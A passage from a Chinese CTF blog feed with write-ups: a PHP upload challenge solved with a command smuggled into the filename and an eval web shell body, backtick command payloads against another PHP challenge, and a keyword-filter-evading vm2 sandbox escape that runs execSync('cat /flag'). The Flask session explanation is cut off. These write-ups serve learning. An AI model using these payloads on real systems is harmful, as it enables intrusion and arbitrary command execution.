class="string">"&lt;img src='data:image/png;base64,"</span>.$picdata.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>/被过滤了，可用cd ..;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /user.php?page=upllloadddd HTTP/1.1</span><br><span class="line">Host: 112d23c0-144a-4af6-b279-94c01280f4c5.node3.buuoj.cn</span><br><span class="line">Content-Length: 238</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAoQUhaCAfqNyGqOc</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: UM_distinctid=17a129a5be511b-050b851bf333b5-4373266-144000-17a129a5be6691; OUTFOX_SEARCH_USER_ID_NCOO=828730801.2157147; PHPSESSID=m804ei9kmp4mcvpbjctvvv7qj4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAoQUhaCAfqNyGqOc</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"file"</span>; filename=<span class="string">"; cd ..;cat flag_233333; #"</span></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php <span class="built_in">echo</span> md5(1); @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[a]); ?&gt;</span><br><span class="line">------WebKitFormBoundaryAoQUhaCAfqNyGqOc--</span><br></pre></td></tr></table></figure><h1 id="红明谷"><a href="#红明谷" class="headerlink" title="红明谷"></a>红明谷</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($input)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/'| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i"</span>,$input))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match("/'| |_|=|php/",$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($input)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array($input))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>($input <span class="keyword">as</span> $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">'sandbox/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) . <span class="string">'/'</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>($_GET[<span class="string">"action"</span>] ?? <span class="string">""</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'pwd'</span>:</span><br><span class="line">        <span class="keyword">echo</span> $dir;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'upload'</span>:</span><br><span class="line">        $data = $_GET[<span class="string">"data"</span>] ?? <span class="string">""</span>;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(<span class="string">"$dir"</span> . <span class="string">"index.php"</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>获取flag文件名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=`ls\<span class="variable">$IFS</span>\<span class="variable">$9</span>../../../../../../`?&gt;</span><br></pre></td></tr></table></figure><p>获取flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=`cat\<span class="variable">$IFS</span>\<span class="variable">$9</span>../../../../../../f*`?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无感情的刷题机器&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>vm2沙箱逃匿</title>
    <link href="https://blog.cfyqy.com/article/4994bd52.html"/>
    <id>https://blog.cfyqy.com/article/4994bd52.html</id>
    <published>2021-05-01T06:31:00.000Z</published>
    <updated>2021-05-02T14:34:16.388Z</updated>
    
    <content type="html"><![CDATA[<p>vm是nodejs实现的一个沙箱环境，但是官方文档并不推荐使用vm来运行不可信任的代码，vm2则是一个npm包，在vm的基础上，通过es6新增的代理机制，来拦截对外部属性的访问。  </p><a id="more"></a>  <p><a href="https://es6.ruanyifeng.com/?search=weakmap&x=0&y=0#docs/proxy" target="_blank" rel="noopener">es6</a></p><h1 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h1><p>vm2是在vm的基础上实现的沙箱，所以内部调用的还是vm的API，在vm中运行一个沙箱环境：<br><img src="../../images/js/vm/1.png" alt=""></p><p>相应的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">  animal: <span class="string">'cat'</span>,</span><br><span class="line">  count: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">'count += 1; name = "kitty";'</span>); <span class="comment">//编译code</span></span><br><span class="line"></span><br><span class="line">vm.createContext(context); <span class="comment">// 创建一个上下文隔离对象</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">  script.runInContext(context); <span class="comment">// 在指定的下文里执行code并返回其结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(context);</span><br><span class="line"><span class="comment">// 打印: &#123; animal: 'cat', count: 12, name: 'kitty' &#125;</span></span><br></pre></td></tr></table></figure><p>将代码编译为 script，然后创建一个上下文 vm.createContext(context) ，最后我们将编译好的脚本放在一个上下文中运行 script.runInContext</p><p>当然也可以不用那么麻烦，直接在沙箱中运行一段代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(vm.runInNewContext(<span class="string">"let a = 2;a"</span>)); <span class="comment">//2</span></span><br></pre></td></tr></table></figure><p>如果不提供上下文变量，那么vm会自己创建一个隔离的上下文context。</p><p>显而易见，vm中最关键的就是 上下文context ，vm能逃逸出来的原理也就是因为 context 并没有拦截针对外部的 constructor 和<code>__proto__</code>等属性 的访问</p><h1 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h1><p>vm2相比vm做了很大的改进，其中之一就是利用了es6新增的 proxy 特性，从而拦截对诸如 constructor 和 <code>__proto__</code> 这些属性的访问</p><p>在vm2 中运行一段代码，如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM, VMScript&#125; = <span class="built_in">require</span>(<span class="string">"vm2"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> VMScript(<span class="string">"let a = 2;a"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> vm = <span class="keyword">new</span> VM();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(vm.run(script));</span><br></pre></td></tr></table></figure><p>其中 VM 是vm2在vm的基础上封装的一个虚拟机，我们只需要实例化之后调用 run 方法即可运行一段脚本。  </p><p>运行的代码和vm2对应的实现：   </p><p><img src="../../images/js/vm/2.png" alt=""> </p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p>假的PHP   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#39;code&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    echo eval(code);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输入Error().stack</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run.php?code&#x3D;Error().stack</span><br></pre></td></tr></table></figure><p>报vm2错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (&#x2F;app&#x2F;node_modules&#x2F;vm2&#x2F;lib&#x2F;main.js:219:62) at &#x2F;app&#x2F;server.js:51:33 at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5) at next (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13) at Route.dispatch (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3) at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5) at &#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22 at Function.process_params (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br></pre></td></tr></table></figure><p><a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225</a></p><p>fuzz 一下，有 for, while, process, exec, eval, constructor, prototype, Function, 加号, 双引号, 单引号被过滤了。</p><p>可以利用字符串拼接和数组调用（对象的方法或者属性名关键字被过滤的情况下可以把对象当成一个数组，然后数组里面的键名用字符串拼接出来）的方式来绕过关键字的限制，但注意到单双引号和加号同时被过滤了，我们想要直接输入字符串拼接的话似乎也行不通了。这里我们可以利用反引号来把文本括起来作为字符串 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings，同时我们也可以利用模板字符串嵌套来拼接出我们想要的被过滤了的字符串。" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings，同时我们也可以利用模板字符串嵌套来拼接出我们想要的被过滤了的字符串。</a></p><p>比如这里 prototype 被过滤了，我们可以这样书写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;</span><br></pre></td></tr></table></figure><p>这样就可以拼接出一个 prototype 字符串,最后payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>读取一下题目的源码<br>server.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> &#123;</span><br><span class="line">    VM</span><br><span class="line">&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> error = <span class="string">``</span>;</span><br><span class="line">app.use(express.static(<span class="string">'public'</span>));</span><br><span class="line">app.get(<span class="string">'/'</span>,</span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(__dirname + <span class="string">"/"</span> + <span class="string">"index.html"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">'/index.php'</span>,</span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(__dirname + <span class="string">"/"</span> + <span class="string">"php.html"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">'/run.php'</span>,</span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> code = req.query.code;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!code) &#123;</span><br><span class="line">            res.sendFile(__dirname + <span class="string">"/"</span> + <span class="string">"php.html"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> blacklists = [<span class="string">'for'</span>, <span class="string">'while'</span>, <span class="string">'process'</span>, <span class="string">'exec'</span>, <span class="string">'eval'</span>, <span class="string">'constructor'</span>, <span class="string">'prototype'</span>, <span class="string">'Function'</span>, <span class="string">'+'</span>, <span class="string">'"'</span>, <span class="string">'\''</span>];</span><br><span class="line">        <span class="keyword">if</span> (blacklists.map(v = &gt;code.includes(v)).filter(v = &gt;v).length !== <span class="number">0</span>) &#123;</span><br><span class="line">            res.send(error);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">new</span> VM().run(code);</span><br><span class="line">        res.send(result.toString());</span><br><span class="line">    &#125; <span class="keyword">catch</span>(ex) &#123;</span><br><span class="line">        res.send(ex.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> server = app.listen(<span class="number">3000</span>,</span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> host = server.address().address;</span><br><span class="line">    <span class="keyword">const</span> port = server.address().port;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"app listening at http://%s:%s"</span>, host, port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>参考文章：</p><p><a href="https://www.anquanke.com/post/id/207283" target="_blank" rel="noopener">vm2实现原理分析</a><br><a href="https://www.anquanke.com/post/id/207291" target="_blank" rel="noopener">vm2沙箱逃逸分析</a><br><a href="https://es6.ruanyifeng.com/?search=weakmap&amp;x=0&amp;y=0#docs/proxy" target="_blank" rel="noopener">https://es6.ruanyifeng.com/?search=weakmap&amp;x=0&amp;y=0#docs/proxy</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;vm是nodejs实现的一个沙箱环境，但是官方文档并不推荐使用vm来运行不可信任的代码，vm2则是一个npm包，在vm的基础上，通过es6新增的代理机制，来拦截对外部属性的访问。  &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>flask的session问题</title>
    <link href="https://blog.cfyqy.com/article/ca41ddf0.html"/>
    <id>https://blog.cfyqy.com/article/ca41ddf0.html</id>
    <published>2021-04-26T14:52:13.000Z</published>
    <updated>2021-07-08T17:07:14.297Z</updated>
    
    <content type="html"><![CDATA[<p>Flask的session是存储在客户端的(可以通过HTTP请求头Cookie字段的session获取)，Flask只对数据进行了签名(防篡改)没有进行加密，session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p><a id="more"></a> <h1 id="session机制"><a href="#session机制" class="headerlink" title="session机制"></a>session机制</h1><p>详细可以看此文章：<br><a href="https://cizixs.com/2017/03/08/flask-insight-session/" target="_blank" rel="noopener">flask 源码解析：session</a><br>引用<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">p师傅</a>的分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecureCookieSessionInterface</span><span class="params">(SessionInterface)</span>:</span></span><br><span class="line">    serializer = session_json_serializer</span><br><span class="line">    session_class = SecureCookieSession</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_signing_serializer</span><span class="params">(self, app)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> app.secret_key:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        signer_kwargs = dict(</span><br><span class="line">            key_derivation=self.key_derivation,</span><br><span class="line">            digest_method=self.digest_method</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> URLSafeTimedSerializer(app.secret_key, salt=self.salt,</span><br><span class="line">                                      serializer=self.serializer,</span><br><span class="line">                                      signer_kwargs=signer_kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_session</span><span class="params">(self, app, request)</span>:</span></span><br><span class="line">        s = self.get_signing_serializer(app)</span><br><span class="line">        <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        val = request.cookies.get(app.session_cookie_name)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> val:</span><br><span class="line">            <span class="keyword">return</span> self.session_class()</span><br><span class="line">        max_age = total_seconds(app.permanent_session_lifetime)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = s.loads(val, max_age=max_age)</span><br><span class="line">            <span class="keyword">return</span> self.session_class(data)</span><br><span class="line">        <span class="keyword">except</span> BadSignature:</span><br><span class="line">            <span class="keyword">return</span> self.session_class()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_session</span><span class="params">(self, app, session, response)</span>:</span></span><br><span class="line">        domain = self.get_cookie_domain(app)</span><br><span class="line">        path = self.get_cookie_path(app)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.should_set_cookie(app, session):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        httponly = self.get_cookie_httponly(app)</span><br><span class="line">        secure = self.get_cookie_secure(app)</span><br><span class="line">        expires = self.get_expiration_time(app, session)</span><br><span class="line">        val = self.get_signing_serializer(app).dumps(dict(session))</span><br><span class="line">        response.set_cookie(app.session_cookie_name, val,</span><br><span class="line">                            expires=expires, httponly=httponly,</span><br><span class="line">                            domain=domain, path=path, secure=secure)</span><br></pre></td></tr></table></figure><p>主要看最后两行代码，新建了URLSafeTimedSerializer类 ，用它的dumps方法将类型为字典的session对象序列化成字符串，然后用response.set_cookie将最后的内容保存在cookie中。<br><a href="https://zhuanlan.zhihu.com/p/120241481" target="_blank" rel="noopener">URLSafeTimedSerialize</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Signer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="string">"""Signs the given string."""</span></span><br><span class="line">        <span class="keyword">return</span> value + want_bytes(self.sep) + self.get_signature(value)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_signature</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="string">"""Returns the signature for the given value"""</span></span><br><span class="line">        value = want_bytes(value)</span><br><span class="line">        key = self.derive_key()</span><br><span class="line">        sig = self.algorithm.get_signature(key, value)</span><br><span class="line">        <span class="keyword">return</span> base64_encode(sig)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Serializer</span><span class="params">(object)</span>:</span></span><br><span class="line">    default_serializer = json</span><br><span class="line">    default_signer = Signer</span><br><span class="line">    <span class="comment"># ....</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(self, obj, salt=None)</span>:</span></span><br><span class="line">        <span class="string">"""Returns a signed string serialized with the internal serializer.</span></span><br><span class="line"><span class="string">        The return value can be either a byte or unicode string depending</span></span><br><span class="line"><span class="string">        on the format of the internal serializer.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        payload = want_bytes(self.dump_payload(obj))</span><br><span 